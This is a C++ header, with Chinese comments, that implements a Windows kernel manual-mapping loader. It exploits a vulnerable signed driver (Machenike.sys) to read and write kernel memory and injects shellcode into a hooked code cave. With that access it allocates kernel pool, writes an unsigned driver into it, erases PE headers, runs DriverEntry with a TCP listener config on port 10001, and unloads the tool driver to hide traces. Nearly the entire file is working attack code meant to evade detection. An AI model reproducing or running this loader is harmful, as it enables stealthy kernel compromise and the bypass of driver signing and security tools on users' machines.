#pragma once
#include "loader_common.h"
#include "phys_walk.h"
#include "manual_map.h"
#include "shellcode_builder.h"

// ============================================================
// pool_mapper.h — 内核独立申请分页/非分页内存手动映射器 (ManualMap 模式)
//
// 核心设计与执行路径：
//   1. 阶段一（内核池内存申请）：
//      利用 Machenike.sys 触发微型探针 Shellcode (scAllocProbe)，
//      在内核态同步调用 ntoskrnl!ExAllocatePoolWithTag(NonPagedPool, SizeOfImage + 0x1000, 'tSmM')，
//      从内核动态分配一段连续独立的内核池内存，取得 allocatedPoolVA。
//   2. 阶段二（用户态展开与重定位修复）：
//      解析 drv_wsk.sys，执行 SectionMap 节区对齐展开与 FixIAT 导入表解析；
//      依据分配的 allocatedPoolVA 修正 BaseRelocation；抹除 PE 头特征。
//   3. 阶段三（物理写入内核池）：
//      利用 WriteKernelVA 原语将展开并修正完毕的整块镜像直接写入该内核池。
//   4. 阶段四（触发 DriverEntry）：
//      注入 scDirectExec Shellcode，构造 fakeDriverObj，传入启动配置参数并调用入口。
//   5. 阶段五（自闭环清理与 Canary 记录）：
//      清理 Code Cave、恢复 Hook 点，记录 Canary 暗桩防止重复加载。
//
// 架构优势：
//   - 零 PTE Remap：不占用、不修改任何宿主驱动（如 tcpip.sys）的物理页映射或 PTE 属性；
//   - 零节区篡改：完全不需要寻找宿主驱动内部的大块空洞；
//   - 动态独立生命周期：内存驻留于独立内核 Pool 中。
// ============================================================

static bool LoadDrvWskViaPool(
    const wchar_t*        drvWskPath,
    const wchar_t*        triggerDrvName = L"Machenike.sys",
    bool                  forceReload    = false,
    const DRV_BOOT_CONFIG* pBootConfig   = nullptr)
{
    LOG_INFO("LoadDrvWskViaPool: Initializing Kernel Pool Manual Map pipeline...");

    // ---- 1. 打开利用驱动 ----
    HANDLE hDev = WhqlOpen();
    if (hDev == INVALID_HANDLE_VALUE) {
        LOG_ERR("LoadDrvWskViaPool: Unable to open WHQL exploit device");
        return false;
    }

    // ---- 2. 获取系统基础内核信息 ----
    WINPMEM_MEMORY_INFO info = {};
    if (!WhqlGetInfo(hDev, &info)) {
        LOG_ERR("LoadDrvWskViaPool: WhqlGetInfo failed");
        CloseHandle(hDev);
        return false;
    }
    uint64_t cr3             = (uint64_t)info.CR3.QuadPart;
    uint64_t ntoskrnlBase    = (uint64_t)info.KernBase.QuadPart;
    uint64_t psLoadedModList = (uint64_t)info.PsLoadedModuleList.QuadPart;
    if (psLoadedModList == 0) {
        psLoadedModList = ResolvePsLoadedModuleList(ntoskrnlBase);
    }

    LOG_INFO("LoadDrvWskViaPool: CR3=0x%016llX NtosBase=0x%016llX PsLML=0x%016llX",
             cr3, ntoskrnlBase, psLoadedModList);

    // ---- 3. 定位触发驱动 (Machenike.sys) ----
    uint64_t triggerDrvBase    = 0;
    uint32_t triggerDrvSize    = 0;
    uint64_t triggerLdrEntryVA = 0;
    bool foundMod = false;
    if (psLoadedModList != 0) {
        foundMod = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList,
                                       triggerDrvName, triggerDrvBase, triggerDrvSize, triggerLdrEntryVA);
    }
    if (!foundMod) {
        foundMod = FindWhqlModuleViaPsapi(triggerDrvName, triggerDrvBase, triggerDrvSize);
    }
    if (!foundMod) {
        LOG_ERR("LoadDrvWskViaPool: Trigger driver %ls not found in system driver list", triggerDrvName);
        CloseHandle(hDev);
        return false;
    }

    // ---- 3.1 检测内核物理暗桩，防止重复加载 ----
    if (!forceReload) {
        if (CheckDriverCanary(hDev, cr3, triggerDrvBase, triggerDrvSize, triggerDrvName)) {
            LOG_OK("LoadDrvWskViaPool: Active canary detected, driver already loaded.");
            CloseHandle(hDev);
            hDev = INVALID_HANDLE_VALUE;
            LOG_INFO("LoadDrvWskViaPool: Core driver already active, unloading '%ls' tool driver...", triggerDrvName);
            UnloadWhqlDriver(triggerDrvName);
            return true;
        }
    } else {
        LOG_WARN("LoadDrvWskViaPool: Force reload enabled, clearing existing kernel canary.");
        ClearDriverCanary(hDev, cr3);
    }

    // ---- 4. 扫描触发驱动中的 default 分支 Hook 点与 Code Cave ----
    WhqlPatchSite site = {};
    if (!FindWhqlDefaultBranch(hDev, cr3, triggerDrvBase, triggerDrvSize, site)) {
        LOG_ERR("LoadDrvWskViaPool: WHQL default branch signature not found");
        CloseHandle(hDev);
        return false;
    }

    const size_t maxPayloadSize = sizeof(ShellcodeParams) + 512;
    uint64_t caveVA = FindWhqlCodeCaveVA(hDev, cr3, triggerDrvBase, maxPayloadSize);
    if (!caveVA) {
        LOG_ERR("LoadDrvWskViaPool: Failed to locate available Code Cave in trigger driver");
        CloseHandle(hDev);
        return false;
    }

    // ---- 5. 读取并展开 drv_wsk.sys ----
    auto rawBuf = ReadFile(drvWskPath);
    if (rawBuf.empty()) {
        LOG_ERR("LoadDrvWskViaPool: Failed to read driver file %ls", drvWskPath);
        CloseHandle(hDev);
        return false;
    }

    MappedImage img = {};
    if (!SectionMap(rawBuf, img)) {
        LOG_ERR("LoadDrvWskViaPool: SectionMap failed");
        CloseHandle(hDev);
        return false;
    }

    // ---- 6. 修复 IAT ----
    if (!FixIAT(hDev, cr3, ntoskrnlBase, img)) {
        LOG_ERR("LoadDrvWskViaPool: FixIAT failed");
        CloseHandle(hDev);
        return false;
    }

    // ---- 7. 阶段一：动态申请内核独立内存池 (ExAllocatePoolWithTag) ----
    LOG_INFO("LoadDrvWskViaPool: Phase 1 - Requesting kernel pool memory allocation (Size=0x%X)...",
             img.SizeOfImage + 0x1000);

    uint64_t pfnExAllocatePoolWithTag = FindKernelExport(hDev, cr3, ntoskrnlBase, "ExAllocatePoolWithTag");
    if (!pfnExAllocatePoolWithTag) {
        pfnExAllocatePoolWithTag = FindKernelExport(hDev, cr3, ntoskrnlBase, "ExAllocatePool2");
    }
    uint64_t pfnIofCompleteRequest = FindKernelExport(hDev, cr3, ntoskrnlBase, "IofCompleteRequest");

    if (!pfnExAllocatePoolWithTag || !pfnIofCompleteRequest) {
        LOG_ERR("LoadDrvWskViaPool: Failed to resolve ntoskrnl memory allocation APIs");
        CloseHandle(hDev);
        return false;
    }

    ShellcodeParams allocParams = {};
    allocParams.pfnExAllocatePoolWithTag = pfnExAllocatePoolWithTag;
    allocParams.pfnIofCompleteRequest    = pfnIofCompleteRequest;
    allocParams.imageSize                = img.SizeOfImage;

    // 注入微型内存分配探针
    {
        ScopedThreadAffinity threadAffinity;
        if (!InjectShellcodeFull(hDev, cr3, site, caveVA, allocParams, scAllocProbe, scAllocProbe_size)) {
            LOG_ERR("LoadDrvWskViaPool: Failed to inject scAllocProbe");
            CloseHandle(hDev);
            return false;
        }

        uint32_t gle = 0;
        if (!WhqlTrigger(hDev, &gle)) {
            LOG_ERR("LoadDrvWskViaPool: Failed to trigger memory allocation probe (GLE=%u)", gle);
            RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, sizeof(ShellcodeParams) + scAllocProbe_size);
            CloseHandle(hDev);
            return false;
        }

        // 从 Code Cave 读回分配到的内核虚拟地址
        ShellcodeParams retAllocParams = {};
        ReadKernelVA(hDev, cr3, caveVA, &retAllocParams, sizeof(retAllocParams));
        RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, sizeof(ShellcodeParams) + scAllocProbe_size);

        allocatedPoolVA = retAllocParams.allocatedPoolVA;
    }
    if (allocatedPoolVA == 0) {
        LOG_ERR("LoadDrvWskViaPool: ExAllocatePoolWithTag returned NULL (Insufficient kernel resources)");
        CloseHandle(hDev);
        return false;
    }

    LOG_OK("LoadDrvWskViaPool: Phase 1 complete! Successfully allocated kernel pool at VA=0x%016llX",
           allocatedPoolVA);

    // ---- 8. 阶段二：重定位修复与 PE 头抹除 ----
    LOG_INFO("LoadDrvWskViaPool: Phase 2 - Applying relocations for target KernelBase=0x%016llX...",
             allocatedPoolVA);
    if (!ApplyRelocation(img, allocatedPoolVA)) {
        LOG_ERR("LoadDrvWskViaPool: ApplyRelocation failed");
        CloseHandle(hDev);
        return false;
    }
    ErasePEHeader(img);

    // ---- 9. 阶段三：将展开好的镜像完整写入内核池内存 ----
    LOG_INFO("LoadDrvWskViaPool: Phase 3 - Writing %zu bytes to kernel pool VA=0x%016llX...",
             img.Image.size(), allocatedPoolVA);
    if (!WriteKernelVA(hDev, cr3, allocatedPoolVA, img.Image.data(), img.Image.size())) {
        LOG_ERR("LoadDrvWskViaPool: WriteKernelVA failed while copying driver image to pool");
        CloseHandle(hDev);
        return false;
    }
    LOG_OK("LoadDrvWskViaPool: Phase 3 complete! Driver image written to kernel pool successfully.");

    // ---- 10. 阶段四：注入执行 Shellcode 并触发 DriverEntry ----
    LOG_INFO("LoadDrvWskViaPool: Phase 4 - Executing DriverEntry via scDirectExec...");
    ShellcodeParams execParams = {};
    execParams.userImageVA            = allocatedPoolVA;
    execParams.imageSize              = img.SizeOfImage;
    execParams.entryPointOffset       = (uint32_t)img.EntryPointOffset;
    execParams.whqlDrvBase            = triggerDrvBase;
    execParams.whqlDrvSize            = triggerDrvSize;
    execParams.whqlLdrEntryVA         = triggerLdrEntryVA;
    execParams.pfnIofCompleteRequest  = pfnIofCompleteRequest;
    execParams.hookReturnVA           = site.kernVA + 5;

    if (pBootConfig) {
        execParams.bootConfig = *pBootConfig;
    } else {
        execParams.bootConfig.Magic         = DRV_BOOT_MAGIC;
        execParams.bootConfig.TransportMode = DRV_TRANSPORT_TCP;
        execParams.bootConfig.Port          = 10001;
        execParams.bootConfig.AuthToken     = 0;
        execParams.bootConfig.Flags         = 0;
    }

    {
        ScopedThreadAffinity threadAffinity;
        if (!InjectShellcodeFull(hDev, cr3, site, caveVA, execParams, scDirectExec, scDirectExec_size)) {
            LOG_ERR("LoadDrvWskViaPool: Failed to inject scDirectExec");
            CloseHandle(hDev);
            return false;
        }

        gle = 0;
        bool ioOk = WhqlTrigger(hDev, &gle);
        RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, sizeof(ShellcodeParams) + scDirectExec_size);

        if (!ioOk) {
            LOG_ERR("LoadDrvWskViaPool: DriverEntry execution failed or returned error (GLE=%u)", gle);
            CloseHandle(hDev);
            return false;
        }
    }
    LOG_OK("LoadDrvWskViaPool: Phase 4 complete! DriverEntry executed successfully.");

    CloseHandle(hDev);
    hDev = INVALID_HANDLE_VALUE;

    // ---- 核心驱动一旦启动成功，立即卸载 Machenike.sys 抹除内核痕迹 ----
    LOG_INFO("LoadDrvWskViaPool: Core driver running successfully, unloading Machenike.sys tool driver...");
    UnloadWhqlDriver(L"Machenike");

    LOG_OK("LoadDrvWskViaPool: [ManualMap] Pipeline successfully completed! drv_wsk loaded into kernel pool.");
    return true;
}
